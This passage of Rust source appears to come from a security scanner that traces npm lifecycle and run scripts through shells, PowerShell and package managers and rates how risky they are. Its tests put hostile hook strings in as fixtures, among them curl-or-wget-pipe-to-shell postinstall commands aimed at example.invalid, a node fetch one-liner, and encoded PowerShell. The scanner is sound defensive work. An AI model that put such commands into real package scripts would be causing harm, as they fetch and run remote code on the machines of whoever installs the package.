                    out.raise(Severity::Info, format!("runs {name} -m {}", short(module)));
                } else {
                    out.raise(
                        Severity::Low,
                        format!("runs the module {} with {name}", short(module)),
                    );
                }
                return;
            }
            if arg.starts_with('-') {
                i += if matches!(arg, "-W" | "-X" | "-I") {
                    2
                } else {
                    1
                };
            } else {
                break;
            }
        }
        match args.get(i).and_then(|file| resolve(cwd, file)) {
            Some(path) => self.local_file(&path, out, false),
            None if args.get(i).is_some() => out.raise(
                Severity::Low,
                format!("runs a file outside the repository with {name}"),
            ),
            None => {}
        }
    }

    /// `bash`, `sh`, ...: a string, a file, or commands from a pipe.
    fn shell(
        &mut self,
        cwd: &str,
        name: &str,
        args: &[String],
        depth: usize,
        stack: &mut Stack,
        out: &mut Outcome,
    ) {
        let mut i = 0;
        while i < args.len() {
            let arg = args[i].as_str();
            let short_flags = arg.starts_with('-') && !arg.starts_with("--");
            if short_flags && arg.contains('c') {
                let code = args.get(i + 1).map_or("", String::as_str);
                out.raise(Severity::High, format!("runs inline code ({name} -c)"));
                let child = self.text(cwd, code, depth + 1, stack);
                out.absorb(child, &format!("the {name} -c string"));
                return;
            }
            if matches!(arg, "-o" | "+o" | "--rcfile" | "--init-file") {
                i += 2;
            } else if arg.starts_with('-') || arg.starts_with('+') {
                i += 1;
            } else {
                break;
            }
        }
        match args.get(i) {
            Some(file) => match resolve(cwd, file) {
                Some(path) => self.local_file(&path, out, false),
                None => out.raise(
                    Severity::Low,
                    format!("runs a file outside the repository with {name}"),
                ),
            },
            None => out.raise(
                Severity::High,
                format!("runs {name} on commands it reads from a pipe"),
            ),
        }
    }

    fn cmd(
        &mut self,
        cwd: &str,
        args: &[String],
        depth: usize,
        stack: &mut Stack,
        out: &mut Outcome,
    ) {
        let at = args
            .iter()
            .position(|a| a.eq_ignore_ascii_case("/c") || a.eq_ignore_ascii_case("/k"));
        match at {
            Some(at) => {
                let text = args[at + 1..].join(" ");
                out.raise(Severity::High, "runs inline code (cmd /c)".to_string());
                let child = self.text(cwd, &text, depth + 1, stack);
                out.absorb(child, "the cmd /c string");
            }
            None => {
                if let Some(path) = args
                    .iter()
                    .find(|a| !a.starts_with('/'))
                    .and_then(|file| resolve(cwd, file))
                {
                    self.local_file(&path, out, false);
                }
            }
        }
    }

    fn powershell(
        &mut self,
        cwd: &str,
        args: &[String],
        depth: usize,
        stack: &mut Stack,
        out: &mut Outcome,
    ) {
        let mut i = 0;
        while i < args.len() {
            let arg = args[i].as_str();
            let flag = arg
                .trim_start_matches(['-', '/', '\u{2013}', '\u{2014}', '\u{2015}'])
                .to_lowercase();
            let dashed = flag.len() != arg.len();
            if !dashed {
                // A bare word is the command text.
                let text = args[i..].join(" ");
                self.powershell_command(cwd, &text, depth, stack, out);
                return;
            }
            if !flag.is_empty() && ("encodedcommand".starts_with(&flag) || flag == "ec") {
                out.raise(
                    Severity::Critical,
                    "runs powershell with an encoded command (-EncodedCommand), which hides what it runs"
                        .to_string(),
                );
                return;
            }
            if !flag.is_empty() && "command".starts_with(&flag) {
                let text = args[i + 1..].join(" ");
                self.powershell_command(cwd, &text, depth, stack, out);
                return;
            }
            if !flag.is_empty() && "file".starts_with(&flag) {
                match args.get(i + 1).and_then(|file| resolve(cwd, file)) {
                    Some(path) => self.local_file(&path, out, false),
                    None => out.raise(
                        Severity::Low,
                        "runs a powershell file outside the repository".to_string(),
                    ),
                }
                return;
            }
            let takes_value = flag == "ep"
                || (flag.len() >= 2 && "executionpolicy".starts_with(&flag))
                || (!flag.is_empty() && "windowstyle".starts_with(&flag))
                || matches!(
                    flag.as_str(),
                    "wd" | "version"
                        | "inputformat"
                        | "outputformat"
                        | "psconsolefile"
                        | "configurationname"
                );
            i += if takes_value { 2 } else { 1 };
        }
    }

    fn powershell_command(
        &mut self,
        cwd: &str,
        text: &str,
        depth: usize,
        stack: &mut Stack,
        out: &mut Outcome,
    ) {
        self.inline("powershell -Command", text, out);
        let child = self.text(cwd, text, depth + 1, stack);
        out.absorb(child, "the powershell command");
    }

    /// What `npm`, `pnpm`, `yarn`, `bun` and the `npx` family ask for.
    fn package_manager(
        &mut self,
        cwd: &str,
        tool: &str,
        args: &[String],
        depth: usize,
        stack: &mut Stack,
        out: &mut Outcome,
    ) {
        const VALUE_FLAGS: &[&str] = &[
            "--prefix",
            "-C",
            "--cwd",
            "--dir",
            "--workspace",
            "-w",
            "--filter",
            "-F",
            "--loglevel",
            "--registry",
            "--cache",
            "--userconfig",
            "--script-shell",
            "--tag",
            "--otp",
            "--scope",
            "--omit",
            "--include",
            "--depth",
            "--reporter",
            "--package",
            "-p",
            "-c",
            "--call",
            "--node-arg",
            "--use-node-version",
            "--network-concurrency",
        ];
        let mut dir = cwd.to_owned();
        let mut positionals: Vec<String> = Vec::new();
        let mut rest: Vec<String> = Vec::new();
        let (mut ignore_scripts, mut global, mut workspaces) = (false, false, false);
        let mut i = 0;
        while i < args.len() {
            let arg = args[i].as_str();
            if arg == "--" {
                rest = args[i + 1..].to_vec();
                break;
            }
            if let Some(flag) = arg.strip_prefix('-') {
                let (flag_name, inline_value) = match flag.split_once('=') {
                    Some((name, value)) => (format!("-{name}"), Some(value.to_string())),
                    None => (arg.to_string(), None),
                };
                let value = match &inline_value {
                    Some(v) => Some(v.clone()),
                    None if VALUE_FLAGS.contains(&flag_name.as_str()) => {
                        i += 1;
                        args.get(i).cloned()
                    }
                    None => None,
                };
                match flag_name.as_str() {
                    "--prefix" | "-C" | "--cwd" | "--dir" => {
                        dir = value
                            .and_then(|v| resolve(cwd, &v))
                            .unwrap_or_else(|| "?outside".to_string());
                    }
                    "--ignore-scripts" => ignore_scripts = value.as_deref() != Some("false"),
                    "-g" | "--global" => global = true,
                    "--workspace" | "-w" | "--workspaces" | "-ws" | "--filter" | "-F" | "-r"
                    | "--recursive" => workspaces = true,
                    "-c" | "--call" if matches!(tool, "npx" | "pnpx" | "bunx") => {
                        if let Some(text) = value {
                            let child = self.text(&dir, &text, depth + 1, stack);
                            out.absorb(child, "npx -c");
                            out.raise(
                                Severity::High,
                                "runs a shell string through npx".to_string(),
                            );
                        }
                    }
                    _ => {}
                }
            } else {
                positionals.push(args[i].clone());
            }
            i += 1;
        }
        let _ = workspaces; // other manifests of a workspace are reported on their own

        let action = match tool {
            "npx" | "pnpx" | "bunx" => Action::Dlx([positionals, rest].concat()),
            "npm" => match positionals.first().map(String::as_str) {
                Some("run" | "run-script" | "rum" | "urn") => positionals
                    .get(1)
                    .map_or(Action::Nothing, |n| Action::Run(n.clone())),
                Some("start") => Action::Run("start".into()),
                Some("stop") => Action::Run("stop".into()),
                Some("restart") => Action::Run("restart".into()),
                Some("test" | "t" | "tst") => Action::Run("test".into()),
                Some(
                    "install" | "i" | "in" | "ins" | "inst" | "insta" | "instal" | "isnt"
                    | "isntall" | "add" | "ci" | "clean-install" | "install-clean" | "rebuild"
                    | "rb" | "link" | "ln" | "update" | "up" | "upgrade" | "install-test" | "it"
                    | "install-ci-test" | "cit",
                ) => Action::Install,
                Some("pack") => Action::Pack,
                Some("publish") => Action::Publish,
                Some("exec" | "x") => Action::Exec([positionals[1..].to_vec(), rest].concat()),
                _ => Action::Nothing,
            },
            _ => {
                // yarn, pnpm, bun
                match positionals.first().map(String::as_str) {
                    None if tool == "yarn" => Action::Install,
                    None => Action::Nothing,
                    Some(
                        "install" | "i" | "add" | "up" | "update" | "upgrade" | "ci" | "fetch"
                        | "rebuild" | "rb",
                    ) => Action::Install,
                    Some("run" | "run-script") => positionals
                        .get(1)
                        .map_or(Action::Nothing, |n| Action::Run(n.clone())),
                    Some("test" | "t") => Action::Run("test".into()),
                    Some("exec") => Action::Exec([positionals[1..].to_vec(), rest].concat()),
                    Some("dlx") => Action::Dlx([positionals[1..].to_vec(), rest].concat()),
                    Some("node") => Action::NodeArgs([positionals[1..].to_vec(), rest].concat()),
                    Some("pack") => Action::Pack,
                    Some("publish") => Action::Publish,
                    Some(builtin) if PM_BUILTINS.contains(&builtin) => Action::Nothing,
                    Some(name) => {
                        let is_script = self
                            .manifest(&dir)
                            .is_some_and(|m| m.scripts.contains_key(name));
                        if is_script || matches!(name, "start" | "stop" | "restart") {
                            Action::Run(name.to_string())
                        } else {
                            Action::Exec([positionals.clone(), rest].concat())
                        }
                    }
                }
            }
        };

        let place = if dir.is_empty() {
            "the root".to_string()
        } else {
            short(&dir)
        };
        match action {
            Action::Nothing => {}
            Action::Run(name) => {
                let child = self.run_named(&dir, &name, depth + 1, stack);
                out.absorb(child, &format!("{tool} run {}", short(&name)));
            }
            Action::Install if ignore_scripts || global => {}
            Action::Install => {
                let child = self.hooks(&dir, INSTALL_HOOKS, "install", depth + 1, stack);
                out.absorb(child, &format!("{tool} install in {place}"));
                if dir != self.home {
                    // The install of another package runs that package's hooks
                    // and the hooks of its dependencies, which are not read.
                    out.raise(
                        Severity::Info,
                        format!(
                            "runs {tool} install in {place}, which runs that package's install \
                             hooks and its dependencies' hooks"
                        ),
                    );
                }
            }
            Action::Pack => {
                let child = self.hooks(&dir, PACK_CHAIN, "pack", depth + 1, stack);
                out.absorb(child, &format!("{tool} pack in {place}"));
            }
            Action::Publish => {
                let child = self.hooks(&dir, PUBLISH_CHAIN, "publish", depth + 1, stack);
                out.absorb(child, &format!("{tool} publish in {place}"));
            }
            Action::Exec(words) => {
                if !words.is_empty() {
                    let mut dir = dir;
                    self.command(&mut dir, &words, depth + 1, stack, out);
                }
            }
            Action::NodeArgs(words) => self.node_like(&dir, "node", &words, depth, stack, out),
            Action::Dlx(words) => self.dlx(&dir, &words, out),
        }
    }

    /// `npx <package>`: a package fetched from a registry (or worse) and run.
    fn dlx(&mut self, dir: &str, words: &[String], out: &mut Outcome) {
        let Some(spec) = words.first() else { return };
        if spec.contains("://")
            || spec.starts_with("git+")
            || spec.starts_with("git@")
            || spec.starts_with("github:")
            || spec.starts_with("gitlab:")
            || spec.starts_with("bitbucket:")
        {
            out.raise(
                Severity::Critical,
                format!(
                    "downloads and runs {} from outside the registry",
                    short(spec)
                ),
            );
            return;
        }
        let without_version = match spec.rfind('@') {
            Some(at) if at > 0 => &spec[..at],
            _ => spec.as_str(),
        };
        let bare = tool_name(without_version);
        if FRONTEND.contains(&bare.as_str()) && out.frontend.is_none() {
            out.frontend = Some(bare.clone());
        }
        if HONEST_DOWNLOAD.contains(&bare.as_str()) {
            out.raise(
                Severity::Low,
                format!(
                    "runs {} through npx, a known tool that downloads prebuilt binaries",
                    short(&bare)
                ),
            );
        } else if FRONTEND.contains(&bare.as_str()) {
            frontend_outcome(&bare, &words[1..], out);
        } else if HONEST.contains(&bare.as_str()) {
            out.raise(
                Severity::Info,
                format!(
                    "runs {} through npx, a tool ordinary projects run here",
                    short(&bare)
                ),
            );
        } else if self
            .manifest(dir)
            .is_some_and(|m| m.deps.contains(without_version))
        {
            out.raise(
                Severity::Low,
                format!(
                    "runs {} through npx, a dependency of this project",
                    short(without_version)
                ),
            );
        } else {
            out.raise(
                Severity::High,
                format!(
                    "downloads and runs the package {}, which is not in this repository",
                    short(spec)
                ),
            );
        }
    }

    /// `npm-run-all`, `run-s`, `run-p`: script names and patterns.
    fn run_all(
        &mut self,
        cwd: &str,
        args: &[String],
        depth: usize,
        stack: &mut Stack,
        out: &mut Outcome,
    ) {
        let mut patterns = Vec::new();
        let mut i = 0;
        while i < args.len() {
            let arg = args[i].as_str();
            if arg == "--" {
                break;
            }
            if matches!(arg, "--max-parallel" | "--npm-path") {
                i += 2;
                continue;
            }
            if !arg.starts_with('-') {
                patterns.push(arg.split_whitespace().next().unwrap_or(arg).to_string());
            }
            i += 1;
        }
        self.run_patterns(cwd, &patterns, depth, stack, out);
    }

    fn run_patterns(
        &mut self,
        dir: &str,
        patterns: &[String],
        depth: usize,
        stack: &mut Stack,
        out: &mut Outcome,
    ) {
        let names: Vec<String> = self
            .manifest(dir)
            .map(|m| m.scripts.keys().cloned().collect())
            .unwrap_or_default();
        for pattern in patterns {
            for name in names.iter().filter(|n| glob_matches(pattern, n)) {
                let child = self.run_named(dir, name, depth + 1, stack);
                out.absorb(child, &format!("script \"{}\"", short(name)));
            }
        }
    }

    /// `concurrently "cmd" "cmd"`, with the `npm:name` shorthand.
    fn concurrently(
        &mut self,
        cwd: &str,
        args: &[String],
        depth: usize,
        stack: &mut Stack,
        out: &mut Outcome,
    ) {
        const VALUE_FLAGS: &[&str] = &[
            "-n",
            "--names",
            "-c",
            "--prefix-colors",
            "-p",
            "--prefix",
            "-l",
            "--prefix-length",
            "-m",
            "--max-processes",
            "-t",
            "--timestamp-format",
            "-s",
            "--success",
            "--kill-signal",
            "--restart-tries",
            "--restart-after",
            "--kill-others-on-fail-delay",
        ];
        let mut i = 0;
        while i < args.len() {
            let arg = args[i].as_str();
            if arg == "--" {
                break;
            }
            if arg.starts_with('-') {
                i += if !arg.contains('=') && VALUE_FLAGS.contains(&arg) {
                    2
                } else {
                    1
                };
                continue;
            }
            let shorthand = ["npm:", "yarn:", "pnpm:", "bun:"]
                .iter()
                .find_map(|prefix| arg.strip_prefix(prefix));
            match shorthand {
                Some(pattern) => {
                    let pattern = pattern
                        .split_whitespace()
                        .next()
                        .unwrap_or(pattern)
                        .to_string();
                    self.run_patterns(cwd, &[pattern], depth, stack, out);
                }
                None => {
                    let child = self.text(cwd, arg, depth + 1, stack);
                    out.absorb(child, "a concurrently command");
                }
            }
            i += 1;
        }
    }
}

// -------------------------------------------------------------------- check

/// The text of the file and where the hooks are in it.
struct Loaded {
    text: String,
    /// The text is what `ctx.text()` holds too, so spans can be given.
    spans_ok: bool,
    root: Result<Node, jsonc::ParseError>,
}

fn is_manifest_path(path: &str) -> bool {
    path.rsplit('/')
        .next()
        .is_some_and(|name| name.eq_ignore_ascii_case("package.json"))
}

fn load(ctx: &Ctx<'_>) -> Option<Loaded> {
    if !is_manifest_path(ctx.path) || ctx.bytes().is_empty() {
        return None;
    }
    // Read as npm reads it: the bytes as UTF-8, not the scanner's text view,
    // which drops NUL bytes that make `JSON.parse` fail.
    let text = String::from_utf8_lossy(ctx.bytes()).into_owned();
    let spans_ok = text == ctx.text();
    let root = jsonc::parse_json(&text);
    Some(Loaded {
        text,
        spans_ok,
        root,
    })
}

fn line_of(text: &str, offset: usize) -> usize {
    jsonc::line_of(text, offset)
}

fn demote(sev: Severity) -> Severity {
    match sev {
        Severity::Critical => Severity::High,
        Severity::High => Severity::Medium,
        Severity::Medium => Severity::Low,
        other => other,
    }
}

fn issue_hit(issue: &FileIssue) -> Hit {
    let reason = match issue {
        FileIssue::TooLarge { size } => format!(
            "this package.json is larger than the scan limit ({size} bytes) and was not read; \
             npm reads it in full, and honest ones are small"
        ),
        FileIssue::Symlink { .. } => "this package.json is a symbolic link; npm follows it and \
             reads the target as the package.json"
            .to_string(),
    };
    Hit {
        line: 1,
        span: None,
        severity: Severity::High,
        reason,
    }
}

/// Rule `deps.npm-lifecycle-hook`.
pub fn lifecycle_hook(ctx: &Ctx<'_>) -> Vec<Hit> {
    let mut hits = Vec::new();
    // A symbolic link whose target was read is judged like the file; one whose
    // target could not be read, and an oversized file, are reported as such.
    if let Some(issue) = &ctx.issue
        && (ctx.bytes().is_empty() || matches!(issue, FileIssue::TooLarge { .. }))
    {
        hits.push(issue_hit(issue));
        return hits;
    }
    let Some(loaded) = load(ctx) else {
        return hits;
    };
    let root = match &loaded.root {
        Ok(root) => root,
        Err(err) => {
            hits.push(unparseable(ctx, &loaded, err));
            return hits;
        }
    };
    let manifest = manifest_of(root);
    let own_dir = dir_of(ctx.path).to_string();
    let hook_names: Vec<String> = manifest
        .scripts
        .keys()
        .filter(|n| is_hook_name(n))
        .cloned()
        .collect();
    let scripts = manifest.scripts.clone();
    let shadowed = manifest.shadowed.clone();
    let duplicate_scripts = manifest.duplicate_scripts;
    let mut resolver = Resolver::new(ctx.repo, &own_dir, manifest);

    for name in hook_names {
        let script = &scripts[&name];
        let install_time = INSTALL_HOOKS.contains(&name.as_str());
        let mut stack: Stack = vec![(own_dir.clone(), name.clone())];
        let mut outcome = resolver.text(&own_dir, &script.value, 1, &mut stack);
        if outcome.truncated {
            outcome.raise(
                Severity::High,
                "the chain of scripts is too deep or too large to follow, so it is treated as \
                 HIGH instead of being called clean"
                    .to_string(),
            );
            if outcome.sev < Some(Severity::High) {
                outcome.sev = Some(Severity::High);
            }
        }
        let Some(mut sev) = outcome.sev else {
            continue;
        };
        let mut reason = if install_time {
            format!("npm runs \"{name}\" on npm install: {}", outcome.why)
        } else {
            sev = demote(sev);
            format!(
                "\"{name}\" is not run by npm install (npm runs it on pack, publish, or when \
                 the repository is installed as a git dependency): {}",
                outcome.why
            )
        };
        if outcome.cycle {
            reason.push_str("; the chain contains a cycle of scripts that call each other");
        }
        if duplicate_scripts {
            reason.push_str("; \"scripts\" appears more than once and npm uses the last one");
        }
        hits.push(Hit {
            line: line_of(&loaded.text, script.offset),
            span: loaded
                .spans_ok
                .then_some(TextSpan(script.offset..script.end)),
            severity: sev,
            reason,
        });
    }

    for (name, script) in shadowed {
        hits.push(Hit {
            line: line_of(&loaded.text, script.offset),
            span: loaded
                .spans_ok
                .then_some(TextSpan(script.offset..script.end)),
            severity: Severity::Low,
            reason: format!(
                "\"{name}\" is defined more than once and npm uses the last definition, so \
                 this earlier one is ignored by npm; a tool that reads the first one sees a \
                 different file"
            ),
        });
    }
    hits
}

/// A `package.json` that `JSON.parse` rejects.
fn unparseable(ctx: &Ctx<'_>, loaded: &Loaded, err: &jsonc::ParseError) -> Hit {
    let line = line_of(&loaded.text, err.offset);
    if err.message == "nesting is too deep" {
        return Hit {
            line,
            span: None,
            severity: Severity::High,
            reason: "this package.json is nested too deeply to analyse; npm may still read it"
                .to_string(),
        };
    }
    let mut reason = format!(
        "this package.json is not valid JSON ({}); npm refuses to read it and will not run it \
         or its scripts, though a tool with a more lenient parser may read it",
        err.message
    );
    // What a lenient reader would find, so that the file is not waved through.
    if let Ok(root) = jsonc::parse(&loaded.text) {
        let manifest = manifest_of(&root);
        let own_dir = dir_of(ctx.path).to_string();
        let names: Vec<String> = manifest
            .scripts
            .keys()
            .filter(|n| INSTALL_HOOKS.contains(&n.as_str()))
            .cloned()
            .collect();
        let scripts = manifest.scripts.clone();
        let mut resolver = Resolver::new(ctx.repo, &own_dir, manifest);
        for name in names {
            let mut stack: Stack = vec![(own_dir.clone(), name.clone())];
            let outcome = resolver.text(&own_dir, &scripts[&name].value, 1, &mut stack);
            if let Some(sev) = outcome.sev
                && sev >= Severity::Medium
            {
                reason.push_str(&format!(
                    "; read leniently, its \"{name}\" hook would be {sev}: {}",
                    outcome.why
                ));
                break;
            }
        }
    }
    Hit {
        line,
        span: None,
        severity: Severity::Low,
        reason,
    }
}

/// Rule `run.npm-script-local-server`.
pub fn run_script(ctx: &Ctx<'_>) -> Vec<Hit> {
    let mut hits = Vec::new();
    if ctx.issue.is_some() && ctx.bytes().is_empty() {
        return hits;
    }
    let Some(loaded) = load(ctx) else {
        return hits;
    };
    let Ok(root) = &loaded.root else {
        return hits;
    };
    let manifest = manifest_of(root);
    let own_dir = dir_of(ctx.path).to_string();
    let present: Vec<String> = RUN_SCRIPTS
        .iter()
        .filter(|n| manifest.scripts.contains_key(**n))
        .map(|n| n.to_string())
        .collect();
    let scripts = manifest.scripts.clone();
    let mut resolver = Resolver::new(ctx.repo, &own_dir, manifest);

    for name in present {
        let script = &scripts[&name];
        let mut stack: Stack = vec![(own_dir.clone(), name.clone())];
        let outcome = resolver.text(&own_dir, &script.value, 1, &mut stack);
        let (Some(file), Some(tool)) = (outcome.node_files.first(), outcome.frontend.as_ref())
        else {
            continue;
        };
        let more = outcome.node_files.len().saturating_sub(1);
        let files = if more > 0 {
            format!("{} (and {more} more)", short(file))
        } else {
            short(file)
        };
        let base = name.trim_start_matches("pre").trim_start_matches("post");
        let unusual = if matches!(base, "build" | "test") {
            format!("; a {base} script that starts a server is unusual")
        } else {
            "; full-stack projects do this, but the file is attacker-controlled when the \
             repository is"
                .to_string()
        };
        hits.push(Hit {
            line: line_of(&loaded.text, script.offset),
            span: loaded
                .spans_ok
                .then_some(TextSpan(script.offset..script.end)),
            severity: ctx.base,
            reason: format!(
                "script \"{name}\" runs the local file {files} next to {tool}{unusual}"
            ),
        });
    }
    hits
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::{Decode, RepoIndex, Views};

    fn run(check: super::super::Check, path: &str, text: &str, files: &[&str]) -> Vec<Hit> {
        let manifests: HashMap<String, Vec<u8>> = files
            .iter()
            .filter(|f| f.ends_with("package.json"))
            .map(|f| (f.to_string(), b"{}".to_vec()))
            .collect();
        let repo = RepoIndex::new(files.iter().chain(&[path])).with_manifests(manifests);
        let views = Views::new(text.as_bytes(), Decode::Utf8WithoutNuls);
        check(&Ctx::new(path, None, &repo, false, Severity::Low, &views))
    }

    fn hook(scripts: &str) -> Vec<Hit> {
        run(
            lifecycle_hook,
            "package.json",
            &format!("{{\"scripts\": {{{scripts}}}}}"),
            &[],
        )
    }

    fn level(scripts: &str) -> Option<Severity> {
        hook(scripts).iter().map(|h| h.severity).max()
    }

    #[test]
    fn shell_split_respects_quotes_and_operators() {
        let (segments, subs) = split_shell(r#"a "b && c" 'd;e' && f | g; h & i 2>&1"#);
        assert_eq!(
            segments,
            vec![
                vec!["a", "b && c", "d;e"],
                vec!["f"],
                vec!["g"],
                vec!["h"],
                vec!["i", "2>&1"],
            ]
        );
        assert!(subs.is_empty());
    }

    #[test]
    fn shell_split_collects_substitutions() {
        let (_, subs) = split_shell("echo $(curl x | sh) `wget y`");
        assert_eq!(subs, vec!["curl x | sh", "wget y"]);
    }

    #[test]
    fn shell_split_keeps_windows_paths() {
        let (segments, _) = split_shell(r".\scripts\setup.bat && node scripts\a.js");
        assert_eq!(segments[0][0], r".\scripts\setup.bat");
        assert_eq!(segments[1][1], r"scripts\a.js");
    }

    #[test]
    fn levels_follow_the_documented_table() {
        assert_eq!(
            level(r#""postinstall": "curl https://example.invalid/x | sh""#),
            Some(Severity::Critical)
        );
        assert_eq!(
            level(r#""postinstall": "wget -qO- example.invalid | bash""#),
            Some(Severity::Critical)
        );
        assert_eq!(
            level(r#""postinstall": "node -e \"fetch('https://example.invalid')\"""#),
            Some(Severity::Critical)
        );
        assert_eq!(
            level(r#""postinstall": "powershell -enc AAAA""#),
            Some(Severity::Critical)
        );
        assert_eq!(
            level(r#""postinstall": "powershell -ExecutionPolicy Bypass -ec AAAA""#),
            Some(Severity::Critical)
        );
        assert_eq!(
            level(r#""postinstall": "node -e \"1\"""#),
            Some(Severity::High)
        );
        assert_eq!(
            level(r#""postinstall": "python -c \"1\"""#),
            Some(Severity::High)
        );
        assert_eq!(
            level(r#""postinstall": "bash -c 'echo hi'""#),
            Some(Severity::High)
        );
        assert_eq!(
            level(r#""postinstall": "node setup.js""#),
            Some(Severity::Medium)
        );
        assert_eq!(
            level(r#""postinstall": "./setup.sh""#),
            Some(Severity::Medium)
        );
        assert_eq!(level(r#""postinstall": "husky""#), Some(Severity::Info));
        assert_eq!(level(r#""postinstall": "echo hi""#), None);
    }

    #[test]
    fn an_honest_tool_does_not_launder_the_rest_of_the_line() {
        assert_eq!(
            level(r#""postinstall": "husky && curl https://example.invalid | sh""#),
            Some(Severity::Critical)
        );
        assert_eq!(
            level(r#""postinstall": "husky; node x.js""#),
            Some(Severity::Medium)
        );
        assert_eq!(
            level(r#""postinstall": "husky || node x.js""#),
            Some(Severity::Medium)
        );
        assert_eq!(
            level(r#""postinstall": "husky & node x.js""#),
            Some(Severity::Medium)
        );
    }

    #[test]
    fn wrappers_and_environment_prefixes_are_looked_through() {
        assert_eq!(
            level(r#""postinstall": "cross-env NODE_ENV=production node setup.js""#),
            Some(Severity::Medium)
        );
        assert_eq!(
            level(r#""postinstall": "FOO=1 node setup.js""#),
            Some(Severity::Medium)
        );
        assert_eq!(
            level(r#""postinstall": "npx -y example-tool""#),
            Some(Severity::High)
        );
        assert_eq!(
            level(r#""postinstall": "npx husky install""#),
            Some(Severity::Info)
        );
    }

    #[test]
    fn pack_hooks_are_one_level_lower() {
        assert_eq!(
            level(r#""prepack": "curl https://example.invalid | sh""#),
            Some(Severity::High)
        );
        assert_eq!(
            level(r#""prepublishOnly": "node build.js""#),
            Some(Severity::Low)
        );
        assert_eq!(
            level(r#""prepublish": "node build.js""#),
            Some(Severity::Medium)
        );
    }

    #[test]
    fn chains_through_package_managers_resolve() {
        assert_eq!(
            level(r#""prepare": "yarn build", "build": "pnpm run gen", "gen": "node g.js""#),
            Some(Severity::Medium)
        );
        assert_eq!(
            level(
                r#""prepare": "npm-run-all -s a:*", "a:one": "echo", "a:two": "curl https://example.invalid""#
            ),
            Some(Severity::Critical)
        );
        assert_eq!(
            level(r#""prepare": "concurrently \"npm:b\" \"echo\"", "b": "python -c 1""#),
            Some(Severity::High)
        );
        assert_eq!(
            level(r#""prepare": "npm run missing""#),
            None,
            "a missing script runs nothing"
        );
    }

    #[test]
    fn pre_and_post_scripts_of_a_run_are_included() {
        assert_eq!(
            level(r#""prepare": "npm run build", "prebuild": "curl https://example.invalid""#),
            Some(Severity::Critical)
        );
    }

    #[test]
    fn ignore_scripts_stops_the_nested_install() {
        let files = ["a/package.json"];
        let text = r#"{"scripts": {"install": "cd a && npm install --ignore-scripts"}}"#;
        assert!(run(lifecycle_hook, "package.json", text, &files).is_empty());
    }

    #[test]
    fn cycles_end() {
        let hits = hook(r#""postinstall": "npm run a", "a": "npm run postinstall""#);
        assert!(hits.is_empty(), "{hits:?}");
        let hits = hook(r#""postinstall": "npm install""#);
        assert!(hits.is_empty(), "{hits:?}");
    }

    #[test]
    fn a_wide_fan_out_stays_within_the_budget() {
        // 40 scripts each calling the next 40 twice would be 2^40 paths.
        let mut scripts = vec![r#""postinstall": "npm run s0""#.to_string()];
        for i in 0..40 {
            scripts.push(format!(
                r#""s{i}": "npm run s{} && npm run s{}""#,
                i + 1,
                i + 1
            ));
        }
        scripts.push(r#""s40": "curl https://example.invalid""#.to_string());
        let hits = hook(&scripts.join(","));
        assert_eq!(hits.len(), 1);
        assert!(hits[0].severity >= Severity::High);
    }

    #[test]
    fn unparseable_file_is_low_and_says_what_a_lenient_reader_sees() {
        let text = "{\n // c\n \"scripts\": {\"postinstall\": \"node -e 1\"}\n}";
        let hits = run(lifecycle_hook, "package.json", text, &[]);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].severity, Severity::Low);
        assert!(hits[0].reason.contains("will not run it"));
        assert!(
            hits[0].reason.contains("would be HIGH"),
            "{}",
            hits[0].reason
        );
        assert_eq!(hits[0].line, 2);
    }

    #[test]
    fn a_nul_byte_is_a_parse_error_as_for_npm() {
        let repo = RepoIndex::default();
        let bytes = b"{\"scripts\": {\"postinstall\": \"node a.js\"}}\0";
        let views = Views::new(bytes, Decode::Utf8WithoutNuls);
        let hits = lifecycle_hook(&Ctx::new(
            "package.json",
            None,
            &repo,
            false,
            Severity::High,
            &views,
        ));
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].severity, Severity::Low);
    }

    #[test]
    fn the_last_duplicate_wins_as_in_json_parse() {
        let text = r#"{"scripts": {"postinstall": "node -e 1", "postinstall": "husky"}}"#;
        let hits = run(lifecycle_hook, "package.json", text, &[]);
        let levels: Vec<_> = hits.iter().map(|h| h.severity).collect();
        assert!(levels.contains(&Severity::Info), "{levels:?}");
        assert!(
            levels.contains(&Severity::Low),
            "the ignored one: {levels:?}"
        );
        assert!(!levels.contains(&Severity::High));
    }

    #[test]
    fn a_hostile_script_cannot_inject_terminal_escapes_into_the_reason() {
        let hits = hook(&format!(
            r#""postinstall": "node \u001b[2Jevil{}.js""#,
            '\u{202e}'
        ));
        let reason = &hits[0].reason;
        assert!(!reason.chars().any(|c| c.is_control()), "{reason:?}");
    }

    #[test]
    fn run_script_needs_both_a_local_file_and_a_frontend_tool() {
        let one = |s: &str| {
            run(
                run_script,
                "package.json",
                &format!("{{\"scripts\": {{{s}}}}}"),
                &[],
            )
        };
        assert_eq!(one(r#""start": "node server.js & vite""#).len(), 1);
        assert!(one(r#""start": "node server.js""#).is_empty());
        assert!(one(r#""start": "vite""#).is_empty());
        let hits = one(r#""test": "node server.js | react-scripts test""#);
        assert!(hits[0].reason.contains("starts a server"));
        assert_eq!(hits[0].severity, Severity::Low);
    }

    #[test]
    fn glob_patterns_follow_npm_run_all() {
        assert!(glob_matches("build:*", "build:css"));
        assert!(!glob_matches("build:*", "build:css:min"));
        assert!(glob_matches("build:**", "build:css:min"));
        assert!(glob_matches("*", "build"));
        assert!(!glob_matches("*", "build:css"));
        assert!(glob_matches("a.b", "a.b"));
        assert!(!glob_matches("a.b", "axb"));
    }

    #[test]
    fn resolve_keeps_paths_inside_the_repository() {
        assert_eq!(resolve("a", "../b/./c.js").as_deref(), Some("b/c.js"));
        assert_eq!(resolve("", "../x"), None);
        assert_eq!(resolve("", "/etc/x"), None);
        assert_eq!(resolve("a", r"b\c.js").as_deref(), Some("a/b/c.js"));
        assert_eq!(resolve("", "$HOME/x"), None);
    }
}
